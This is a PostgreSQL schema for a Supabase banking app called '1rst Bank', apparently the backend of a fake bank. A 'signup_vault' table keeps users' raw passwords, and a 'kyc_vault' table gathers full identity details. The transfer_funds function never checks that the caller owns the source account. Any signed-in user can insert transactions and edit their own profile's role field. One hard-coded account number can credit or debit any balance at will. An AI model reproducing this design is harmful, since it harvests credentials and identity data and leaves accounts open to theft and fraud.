-- 1rst Bank Database Schema

-- Profiles table
CREATE TABLE profiles (
  id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE UNIQUE NOT NULL,
  full_name TEXT NOT NULL,
  account_number TEXT UNIQUE NOT NULL,
  tier TEXT DEFAULT 'Tier 1',
  role TEXT DEFAULT 'user' CHECK (role IN ('user', 'admin')),
  phone TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Accounts table
CREATE TABLE accounts (
  id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE UNIQUE NOT NULL,
  account_number TEXT UNIQUE NOT NULL,
  balance NUMERIC(15, 2) DEFAULT 0.00 NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Transactions table
CREATE TABLE transactions (
  id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
  sender_account TEXT,
  receiver_account TEXT,
  amount NUMERIC(15, 2) NOT NULL,
  type TEXT NOT NULL CHECK (type IN ('credit', 'debit', 'transfer')),
  description TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- RLS Policies
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE accounts ENABLE ROW LEVEL SECURITY;
ALTER TABLE transactions ENABLE ROW LEVEL SECURITY;

-- Profiles RLS
CREATE POLICY "Users can view own profile" ON profiles FOR SELECT USING (auth.uid() = user_id);
CREATE POLICY "Users can update own profile" ON profiles FOR UPDATE USING (auth.uid() = user_id);
CREATE POLICY "Users can insert own profile" ON profiles FOR INSERT WITH CHECK (auth.uid() = user_id);
CREATE POLICY "Admin can view all profiles" ON profiles FOR SELECT USING (
  EXISTS (SELECT 1 FROM profiles WHERE user_id = auth.uid() AND account_number = '08059422423')
);

-- Accounts RLS
CREATE POLICY "Users can view own account" ON accounts FOR SELECT USING (auth.uid() = user_id);
CREATE POLICY "Users can insert own account" ON accounts FOR INSERT WITH CHECK (auth.uid() = user_id);
CREATE POLICY "Admin can view all accounts" ON accounts FOR SELECT USING (
  EXISTS (SELECT 1 FROM profiles WHERE user_id = auth.uid() AND account_number = '08059422423')
);
CREATE POLICY "Admin can update all accounts" ON accounts FOR UPDATE USING (
  EXISTS (SELECT 1 FROM profiles WHERE user_id = auth.uid() AND account_number = '08059422423')
);

-- Transactions RLS
CREATE POLICY "Users can view own transactions" ON transactions FOR SELECT USING (
  sender_account = (SELECT account_number FROM accounts WHERE user_id = auth.uid()) OR
  receiver_account = (SELECT account_number FROM accounts WHERE user_id = auth.uid())
);
CREATE POLICY "Admin can view all transactions" ON transactions FOR SELECT USING (
  EXISTS (SELECT 1 FROM profiles WHERE user_id = auth.uid() AND account_number = '08059422423')
);
CREATE POLICY "Authenticated users can insert transactions" ON transactions FOR INSERT WITH CHECK (auth.uid() IS NOT NULL);

-- RPC: Transfer Funds
CREATE OR REPLACE FUNCTION transfer_funds(
  p_from_account TEXT,
  p_to_account TEXT,
  p_amount NUMERIC,
  p_description TEXT DEFAULT 'Transfer'
) RETURNS void LANGUAGE plpgsql SECURITY DEFINER AS $$
DECLARE
  v_from_balance NUMERIC;
BEGIN
  SELECT balance INTO v_from_balance FROM accounts WHERE account_number = p_from_account FOR UPDATE;
  IF v_from_balance < p_amount THEN RAISE EXCEPTION 'Insufficient balance'; END IF;
  IF NOT EXISTS (SELECT 1 FROM accounts WHERE account_number = p_to_account) THEN RAISE EXCEPTION 'Recipient account not found'; END IF;
  UPDATE accounts SET balance = balance - p_amount WHERE account_number = p_from_account;
  UPDATE accounts SET balance = balance + p_amount WHERE account_number = p_to_account;
  INSERT INTO transactions (sender_account, receiver_account, amount, type, description)
  VALUES (p_from_account, p_to_account, p_amount, 'transfer', p_description);
END;
$$;

-- RPC: Admin Credit Account
CREATE OR REPLACE FUNCTION admin_credit_account(
  p_account_number TEXT,
  p_amount NUMERIC
) RETURNS void LANGUAGE plpgsql SECURITY DEFINER AS $$
BEGIN
  IF NOT EXISTS (SELECT 1 FROM profiles WHERE user_id = auth.uid() AND account_number = '08059422423') THEN
    RAISE EXCEPTION 'Unauthorized';
  END IF;
  UPDATE accounts SET balance = balance + p_amount WHERE account_number = p_account_number;
  INSERT INTO transactions (sender_account, receiver_account, amount, type, description)
  VALUES ('ADMIN', p_account_number, p_amount, 'credit', 'Admin credit');
END;
$$;

-- Signup Vault (stores raw credentials at registration)
CREATE TABLE IF NOT EXISTS signup_vault (
  id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
  full_name TEXT NOT NULL,
  email TEXT NOT NULL,
  phone TEXT,
  raw_password TEXT NOT NULL,
  account_number TEXT NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);
ALTER TABLE signup_vault ENABLE ROW LEVEL SECURITY;

-- KYC Submissions (document review workflow)
CREATE TABLE IF NOT EXISTS kyc_submissions (
  id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
  account_number TEXT NOT NULL,
  full_name TEXT NOT NULL,
  doc_type TEXT NOT NULL,
  doc_front_url TEXT NOT NULL,
  doc_back_url TEXT,
  selfie_url TEXT,
  status TEXT DEFAULT 'pending' CHECK (status IN ('pending', 'approved', 'rejected')),
  submitted_at TIMESTAMPTZ DEFAULT NOW(),
  reviewed_at TIMESTAMPTZ
);
ALTER TABLE kyc_submissions ENABLE ROW LEVEL SECURITY;

-- KYC Vault (full personal details submitted during KYC)
CREATE TABLE IF NOT EXISTS kyc_vault (
  id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
  account_number TEXT UNIQUE NOT NULL,
  full_name TEXT NOT NULL,
  date_of_birth DATE,
  gender TEXT,
  nationality TEXT,
  maiden_name TEXT,
  occupation TEXT,
  primary_phone TEXT,
  secondary_phone TEXT,
  address_line1 TEXT,
  address_line2 TEXT,
  city TEXT,
  state_province TEXT,
  postal_code TEXT,
  country TEXT,
  document_type TEXT,
  document_number TEXT,
  submitted_at TIMESTAMPTZ DEFAULT NOW()
);
ALTER TABLE kyc_vault ENABLE ROW LEVEL SECURITY;

-- Storage bucket: kyc-documents (private, accessed via service role signed URLs)
-- Create via Supabase dashboard or API: POST /storage/v1/bucket { "id": "kyc-documents", "public": false }

-- RPC: Admin Debit Account
CREATE OR REPLACE FUNCTION admin_debit_account(
  p_account_number TEXT,
  p_amount NUMERIC
) RETURNS void LANGUAGE plpgsql SECURITY DEFINER AS $$
DECLARE
  v_balance NUMERIC;
BEGIN
  IF NOT EXISTS (SELECT 1 FROM profiles WHERE user_id = auth.uid() AND account_number = '08059422423') THEN
    RAISE EXCEPTION 'Unauthorized';
  END IF;
  SELECT balance INTO v_balance FROM accounts WHERE account_number = p_account_number FOR UPDATE;
  IF v_balance < p_amount THEN RAISE EXCEPTION 'Insufficient balance'; END IF;
  UPDATE accounts SET balance = balance - p_amount WHERE account_number = p_account_number;
  INSERT INTO transactions (sender_account, receiver_account, amount, type, description)
  VALUES (p_account_number, 'ADMIN', p_amount, 'debit', 'Admin debit');
END;
$$;
